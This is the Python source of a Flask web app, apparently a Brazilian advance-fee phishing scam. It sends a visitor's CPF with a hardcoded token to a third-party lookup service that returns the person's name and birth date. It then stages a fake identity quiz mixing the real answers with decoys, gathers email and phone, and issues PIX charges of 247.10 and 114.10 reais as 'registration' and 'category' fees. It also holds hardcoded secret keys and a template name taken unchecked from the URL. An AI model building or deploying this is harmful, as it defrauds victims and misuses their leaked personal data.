import os
import requests
import logging
import random
from datetime import datetime, timedelta
from typing import Dict, Any
from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify

# Configuração do logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
app.static_folder = 'static'

API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"

def gerar_nomes_falsos(nome_real: str) -> list:
    nomes = [
        "MARIA SILVA SANTOS",
        "JOSE OLIVEIRA SOUZA",
        "ANA PEREIRA LIMA",
        "JOAO FERREIRA COSTA",
        "ANTONIO RODRIGUES ALVES",
        "FRANCISCO GOMES SILVA",
        "CARLOS SANTOS OLIVEIRA",
        "PAULO RIBEIRO MARTINS",
        "PEDRO ALMEIDA COSTA",
        "LUCAS CARVALHO LIMA"
    ]
    # Remove nomes que são muito similares ao nome real
    nomes = [n for n in nomes if len(set(n.split()) & set(nome_real.split())) == 0]
    # Seleciona 2 nomes aleatórios
    nomes_falsos = random.sample(nomes, 2)
    # Adiciona o nome real e embaralha
    todos_nomes = nomes_falsos + [nome_real]
    random.shuffle(todos_nomes)
    return todos_nomes

def gerar_datas_falsas(data_real: str) -> list:
    data_real = datetime.strptime(data_real.split()[0], '%Y-%m-%d')
    datas_falsas = []

    # Gera duas datas falsas próximas à data real
    for _ in range(2):
        dias = random.randint(-365*2, 365*2)  # ±2 anos
        data_falsa = data_real + timedelta(days=dias)
        datas_falsas.append(data_falsa)

    # Adiciona a data real e embaralha
    todas_datas = datas_falsas + [data_real]
    random.shuffle(todas_datas)

    # Formata as datas no padrão brasileiro
    return [data.strftime('%d/%m/%Y') for data in todas_datas]

@app.route('/consultar_cpf', methods=['POST'])
def consultar_cpf():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('index'))

    try:
        response = requests.get(
            API_URL.format(cpf=cpf_numerico),
            timeout=30
        )
        response.raise_for_status()
        dados = response.json()

        if dados and 'DADOS' in dados and 'NOME' in dados['DADOS']:
            dados_usuario = {
                'cpf': cpf_numerico,
                'nome_real': dados['DADOS']['NOME'],
                'data_nasc': dados['DADOS']['NASC'],
                'nomes': gerar_nomes_falsos(dados['DADOS']['NOME'])
            }
            session['dados_usuario'] = dados_usuario
            return render_template('verificar_nome.html',
                                dados=dados_usuario,
                                current_year=datetime.now().year)
        else:
            flash('CPF não encontrado ou dados incompletos.')
            return redirect(url_for('index'))

    except Exception as e:
        logger.error(f"Erro na consulta: {str(e)}")
        flash('Erro ao consultar CPF. Por favor, tente novamente.')
        return redirect(url_for('index'))

@app.route('/verificar_nome', methods=['POST'])
def verificar_nome():
    nome_selecionado = request.form.get('nome')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not nome_selecionado:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if nome_selecionado != dados_usuario['nome_real']:
        flash('Nome selecionado incorreto. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Gera datas falsas para a próxima etapa
    datas = gerar_datas_falsas(dados_usuario['data_nasc'])
    dados_usuario['datas'] = datas
    session['dados_usuario'] = dados_usuario

    return render_template('verificar_data.html',
                         dados=dados_usuario,
                         current_year=datetime.now().year)

@app.route('/verificar_data', methods=['POST'])
def verificar_data():
    data_selecionada = request.form.get('data')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not data_selecionada:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    data_real = datetime.strptime(dados_usuario['data_nasc'].split()[0], '%Y-%m-%d').strftime('%d/%m/%Y')
    if data_selecionada != data_real:
        flash('Data selecionada incorreta. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Se a verificação foi bem sucedida, redireciona para a página de contato
    return render_template('verificar_contato.html', current_year=datetime.now().year)

@app.route('/verificar_contato', methods=['POST'])
def verificar_contato():
    email = request.form.get('email')
    telefone = request.form.get('telefone')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not email or not telefone:
        flash('Sessão expirada ou dados incompletos. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Adiciona os dados de contato ao objeto dados_usuario
    dados_usuario['email'] = email
    dados_usuario['phone'] = ''.join(filter(str.isdigit, telefone))  # Remove formatação
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de dados do usuário
    return render_template('dados_usuario.html',
                         dados={'name': dados_usuario['nome_real'],
                               'email': email,
                               'phone': dados_usuario['phone'],
                               'cpf': dados_usuario['cpf']},
                         current_year=datetime.now().year)


class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        try:
            # Format and validate amount
            amount_in_cents = int(float(data['amount']) * 100)

            payment_data = {
                "name": data['name'],
                "email": data['email'],
                "cpf": ''.join(filter(str.isdigit, data['cpf'])),
                "phone": data.get('phone', ''),
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "FINALIZAR CADASTRO",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }

            response = requests.post(
                f"{self.API_URL}/transaction.purchase",
                json=payment_data,
                headers=self._get_headers(),
                timeout=30
            )

            if response.status_code == 200:
                response_data = response.json()
                return {
                    'id': response_data.get('id'),
                    'pixCode': response_data.get('pixCode'),
                    'pixQrCode': response_data.get('pixQrCode'),
                    'expiresAt': response_data.get('expiresAt'),
                    'status': response_data.get('status', 'pending')
                }
            else:
                logger.error(f"Erro na API de pagamento: {response.text}")
                raise ValueError("Erro ao processar pagamento")

        except Exception as e:
            logger.error(f"Erro ao criar pagamento: {str(e)}")
            raise

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=self._get_headers(),
                timeout=30
            )

            logger.info(f"Payment status check response: {response.status_code}")
            logger.debug(f"Payment status response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }

                current_status = payment_data.get('status', 'PENDING')
                mapped_status = status_mapping.get(current_status, 'pending')

                logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")

                return {
                    'status': mapped_status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode')
                }
            elif response.status_code == 404:
                logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                logger.error(error_message)
                return {'status': 'pending'}

        except Exception as e:
            logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending'}


def create_payment_api() -> For4PaymentsAPI:
    secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY", "7e0f69db-7b2d-4166-b8c5-fceed89b67c6")
    return For4PaymentsAPI(secret_key)

@app.route('/')
def index():
    return render_template('index.html', current_year=datetime.now().year)


@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    user_data = session.get('dados_usuario') # Corrected session key
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['nome_real'], # Corrected key
            'email': user_data.get('email', generate_random_email()), # Handle missing email
            'cpf': user_data['cpf'],
            'phone': user_data.get('phone', generate_random_phone()), # Handle missing phone
            'amount': 247.10  # Soma das duas taxas: 128,40 + 118,70
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento.html',
                           pix_data=pix_data,
                           valor_total="247,10",
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('index'))

@app.route('/pagamento_categoria', methods=['POST'])
def pagamento_categoria():
    user_data = session.get('dados_usuario') # Corrected session key
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    categoria = request.form.get('categoria')
    if not categoria:
        flash('Categoria não especificada.')
        return redirect(url_for('obrigado'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['nome_real'], # Corrected key
            'email': user_data.get('email', generate_random_email()), # Handle missing email
            'cpf': user_data['cpf'],
            'phone': user_data.get('phone', generate_random_phone()), # Handle missing phone
            'amount': 114.10  # Valor fixo para taxa de categoria
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento_categoria.html',
                           pix_data=pix_data,
                           valor_total="114,10",
                           categoria=categoria,
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento da categoria: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('obrigado'))

@app.route('/check_payment/<payment_id>')
def check_payment(payment_id):
    try:
        payment_api = create_payment_api()
        status_data = payment_api.check_payment_status(payment_id)
        return jsonify(status_data)
    except Exception as e:
        logger.error(f"Error checking payment status: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/obrigado')
def obrigado():
    user_data = session.get('dados_usuario') #Corrected session key
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template('obrigado.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/categoria/<tipo>')
def categoria(tipo):
    user_data = session.get('dados_usuario') # Corrected session key
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template(f'categoria_{tipo}.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

def generate_random_email():
    return f"user_{random.randint(1,1000)}@example.com"

def generate_random_phone():
    return f"55119{random.randint(10000000,99999999)}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)